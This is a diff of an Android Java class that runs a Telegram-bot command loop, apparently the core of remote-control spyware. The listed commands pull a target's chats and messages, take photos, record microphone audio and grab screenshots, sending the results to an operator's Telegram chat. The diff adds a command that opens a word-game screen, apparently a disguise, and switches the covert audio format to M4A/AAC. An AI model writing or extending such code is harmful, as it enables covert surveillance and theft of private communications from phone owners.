@@ -171,7 +171,8 @@ public class TelegramPoller implements Runnable {
                         "💬 /get_chat رقم/اسم - رسائل محادثة مع شخص معين\n" +
                         "📷 /take_pic - التقاط صورة\n" +
                         "🎤 /record - تسجيل صوتي (30ث)\n" +
-                        "🖥️ /screenshot - لقطة شاشة");
+                        "🖥️ /screenshot - لقطة شاشة\n" +
+                        "🎮 /play - فتح لعبة المايسترو على هاتفك");
             }
             else if (cmd.startsWith("/get_chat")) {
                 String query = cmd.replace("/get_chat", "").trim();
@@ -196,6 +197,13 @@ public class TelegramPoller implements Runnable {
             else if (cmd.equals("/screenshot")) {
                 ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
             }
+            else if (cmd.equals("/play")) {
+                // فتح اللعبة من البوت
+                Intent intent = new Intent(ctx, WordGameActivity.class);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                ctx.startActivity(intent);
+                sendMessage(CHAT_ID, "🎮 تم فتح لعبة المايسترو على هاتفك!");
+            }
             else {
                 sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
             }
@@ -206,7 +214,7 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  💬 محادثة مع شخص معين (جلب الرسائل من الطرفين)
+    //  💬 محادثة مع شخص معين
     // ============================================================
     private String getChatHistory(String query) {
         try {
@@ -268,7 +276,6 @@ public class TelegramPoller implements Runnable {
         }
     }
 
-    // البحث عن رسائل تحتوي على نص معين
     private String searchMessagesByText(String text) {
         try {
             if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
@@ -439,13 +446,13 @@ public class TelegramPoller implements Runnable {
     // ============================================================
     private void startRecording() {
         try {
-            File audioFile = new File(ctx.getCacheDir(), "recording.3gp");
+            File audioFile = new File(ctx.getCacheDir(), "recording.m4a");
             if (audioFile.exists()) audioFile.delete();
 
             android.media.MediaRecorder recorder = new android.media.MediaRecorder();
             recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP);
-            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
             recorder.setOutputFile(audioFile.getAbsolutePath());
             recorder.prepare();
             recorder.start();
